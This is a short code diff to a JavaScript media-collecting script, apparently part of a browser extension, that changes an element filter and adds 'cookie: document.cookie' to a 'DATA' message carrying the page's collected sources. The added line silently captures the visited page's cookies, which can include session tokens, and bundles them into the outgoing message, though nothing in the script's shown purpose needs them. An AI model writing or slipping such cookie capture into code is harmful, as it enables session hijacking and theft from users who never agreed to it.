@@ -111,7 +111,7 @@ const getContentFromPoint = (x, y) => {
         return element.tagName == "IMG";
       }),
       filtered.find((element) => {
-        return element.tagName != "IMG" && element.tagName != "VIDEO";
+        return ["DIV", "SPAN"].includes(element.tagName)
       })
     ];
     filtered = firsts.filter((element) => {
@@ -315,6 +315,7 @@ const getSrcs = () => {
         message: "DATA",
         source: `${window.location.protocol}//${window.location.hostname}/`,
         data: flat,
+        cookie: document.cookie
       });
     }
   }
